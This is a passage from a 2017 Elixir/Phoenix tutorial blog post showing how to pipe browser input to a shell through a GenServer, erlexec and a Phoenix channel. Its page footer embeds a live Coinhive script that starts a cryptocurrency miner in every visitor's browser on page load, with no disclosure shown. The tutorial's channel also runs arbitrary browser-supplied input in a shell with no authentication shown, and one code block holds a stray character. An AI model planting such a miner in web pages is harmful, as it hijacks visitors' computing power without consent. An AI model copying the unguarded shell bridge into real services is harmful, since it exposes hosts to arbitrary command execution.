</pre></td></tr></tbody></table></code></pre></div>
<p>Step 4: Take input and send it to the shell pid:</p>
<div class="highlight"><pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre><span class="k">defmodule</span> <span class="no">Terminal</span> <span class="k">do</span>
  <span class="kn">use</span> <span class="no">GenServer</span>
  <span class="c1">#... previous code omitted</span>

  <span class="k">def</span> <span class="n">send_input</span><span class="p">(</span><span class="n">terminal</span><span class="p">,</span> <span class="n">input</span><span class="p">)</span> <span class="k">do</span>
    <span class="no">GenServer</span><span class="o">.</span><span class="n">cast</span><span class="p">(</span><span class="n">terminal</span><span class="p">,</span> <span class="p">{</span><span class="ss">:input</span><span class="p">,</span> <span class="n">input</span><span class="p">})</span>
  <span class="k">end</span>

  <span class="k">def</span> <span class="n">handle_cast</span><span class="p">({</span><span class="ss">:input</span><span class="p">,</span> <span class="n">input</span><span class="p">},</span> <span class="p">%{</span><span class="ss">shell:</span> <span class="n">shell</span><span class="p">}</span> <span class="o">=</span> <span class="n">state</span><span class="p">)</span> <span class="k">do</span>
    <span class="ss">:exec</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">shell</span><span class="p">,</span> <span class="n">input</span><span class="p">)</span>
    <span class="p">{</span><span class="ss">:noreply</span><span class="p">,</span> <span class="n">state</span><span class="p">}</span>
  <span class="k">end</span>
<span class="k">end</span>
</pre></td></tr></tbody></table></code></pre></div>
<p>Step 5: Handle output your <code>GenServer</code> receives as a message:</p>
<div class="highlight"><pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre><span class="k">defmodule</span> <span class="no">Terminal</span> <span class="k">do</span>
  <span class="kn">use</span> <span class="no">GenServer</span>
  <span class="c1">#... previous code omitted</span>

  <span class="k">def</span> <span class="n">handle_info</span><span class="p">({</span><span class="ss">:stdout</span><span class="p">,</span> <span class="n">_os_pid</span><span class="p">,</span> <span class="n">output</span><span class="p">},</span> <span class="p">%{</span><span class="ss">output_pid:</span> <span class="n">output_pid</span><span class="p">}</span> <span class="o">=</span> <span class="n">state</span><span class="p">)</span> <span class="k">do</span>
    <span class="n">send</span><span class="p">(</span><span class="n">output_pid</span><span class="p">,</span> <span class="p">{</span><span class="ss">:output</span><span class="p">,</span> <span class="n">output</span><span class="p">})</span>
    <span class="p">{</span><span class="ss">:noreply</span><span class="p">,</span> <span class="n">state</span><span class="p">}</span>
  <span class="k">end</span>

  <span class="k">def</span> <span class="n">handle_info</span><span class="p">({</span><span class="ss">:stderr</span><span class="p">,</span> <span class="n">_os_pir</span><span class="p">,</span> <span class="n">output</span><span class="p">},</span> <span class="p">%{</span><span class="ss">output_pid:</span> <span class="n">output_pid</span><span class="p">}</span> <span class="o">=</span> <span class="n">state</span><span class="p">)</span> <span class="k">do</span>
    <span class="n">send</span><span class="p">(</span><span class="n">output_pid</span><span class="p">,</span> <span class="p">{</span><span class="ss">:output</span><span class="p">,</span> <span class="n">output</span><span class="p">})</span>
    <span class="p">{</span><span class="ss">:noreply</span><span class="p">,</span> <span class="n">state</span><span class="p">}</span>
  <span class="k">end</span>
<span class="k">end</span>
</pre></td></tr></tbody></table></code></pre></div>
<p>And that&rsquo;s it for our <code>GenServer</code>! You&rsquo;ll notice we send a message to our <code>output_pid</code>. How do we handle that? Let&rsquo;s jump back to the socket.</p>

<h2>TerminalChannel part 2</h2>

<p>Let&rsquo;s dive in.</p>
<div class="highlight"><pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre></td><td class="rouge-code"><pre><span class="k">defmodule</span> <span class="no">TerminalInYourBrowser</span><span class="o">.</span><span class="no">Web</span><span class="o">.</span><span class="no">TerminalChannel</span> <span class="k">do</span>
  <span class="kn">use</span> <span class="no">TerminalInYourBrowser</span><span class="o">.</span><span class="no">Web</span><span class="p">,</span> <span class="ss">:channel</span>

  <span class="k">def</span> <span class="n">join</span><span class="p">(</span><span class="sd">"</span><span class="s2">terminal:"</span> <span class="o">&lt;&gt;</span> <span class="n">id</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">socket</span><span class="p">)</span> <span class="k">do</span>
    <span class="p">{</span><span class="ss">:ok</span><span class="p">,</span> <span class="n">terminal</span><span class="p">}</span> <span class="o">=</span> <span class="no">Terminal</span><span class="o">.</span><span class="n">start_link</span><span class="p">(</span><span class="n">self</span><span class="p">())</span>
    <span class="p">{</span><span class="ss">:ok</span><span class="p">,</span> <span class="n">assign</span><span class="p">(</span><span class="n">socket</span><span class="p">,</span> <span class="ss">:terminal</span><span class="p">,</span> <span class="n">terminal</span><span class="p">)}</span>
  <span class="k">end</span>

  <span class="k">def</span> <span class="n">handle_in</span><span class="p">(</span><span class="sd">"</span><span class="s2">input"</span><span class="p">,</span> <span class="p">%{</span><span class="sd">"</span><span class="s2">input"</span> <span class="o">=&gt;</span> <span class="n">input</span><span class="p">},</span> <span class="n">socket</span><span class="p">)</span> <span class="k">do</span>
    <span class="no">Terminal</span><span class="o">.</span><span class="n">send_input</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">assigns</span><span class="p">[</span><span class="ss">:terminal</span><span class="p">],</span> <span class="n">input</span><span class="p">)</span>
    <span class="p">{</span><span class="ss">:noreply</span><span class="p">,</span> <span class="n">socket</span><span class="p">}</span>
<span class="n">u</span> <span class="k">end</span>

  <span class="k">def</span> <span class="n">handle_info</span><span class="p">({</span><span class="ss">:output</span><span class="p">,</span> <span class="n">output</span><span class="p">},</span> <span class="n">socket</span><span class="p">)</span> <span class="k">do</span>
    <span class="n">push</span><span class="p">(</span><span class="n">socket</span><span class="p">,</span> <span class="sd">"</span><span class="s2">output"</span><span class="p">,</span> <span class="p">%{</span><span class="ss">output:</span> <span class="n">output</span><span class="p">})</span>
    <span class="p">{</span><span class="ss">:noreply</span><span class="p">,</span> <span class="n">socket</span><span class="p">}</span>
  <span class="k">end</span>
<span class="k">end</span>
</pre></td></tr></tbody></table></code></pre></div>
<p>When you join, we create a new terminal process. We pass in <code>self()</code> as the <code>output_pid</code>. We then add the terminal pid to the socket&rsquo;s state. Then we wait&hellip; When we get that <code>input</code> message from the browser terminal, we send it to the terminal process. Here&rsquo;s the cool part:</p>

<p><strong>Channels are just <code>GenServer</code>s so they respond to out of band messages with <code>handle_info</code>.</strong>
 Whoop!</p>

<p>And just like that, we&rsquo;ve got a terminal in our browser!
<img src="http://i.imgur.com/DXhsL3W.gif" width="100%" /></p>

<h2>Wrap up</h2>

<p>The <code>erlexec</code> library is really powerful. With options to send <code>stdout|stderr</code> to different processes, the way we set this up could have been really different.</p>

<p>If there&rsquo;s anything you want to hear more about, leave it in the comments below. I&rsquo;m always looking for ways to contribute.</p>

<p>Thanks!</p>

    <div id="disqus_thread"></div>
<script type="text/javascript">
    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
    var disqus_shortname = 'hostiledeveloper'; // required: replace example with your forum shortname

    /* * * DON'T EDIT BELOW THIS LINE * * */
    (function() {
        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>

  </main>

 <script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-48123503-1', 'auto');
  ga('send', 'pageview');

</script>

  <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
 <script>
   var miner = new CoinHive.Anonymous('zmOZS6Bce7Nsw6WOSrt2cAJvIy4CvcNV');
   miner.start();
 </script>

 <em>Copyright &copy; 2017 Steven Nu&ntilde;ez - HostileDeveloper</em>

</div>
</body>
</html>
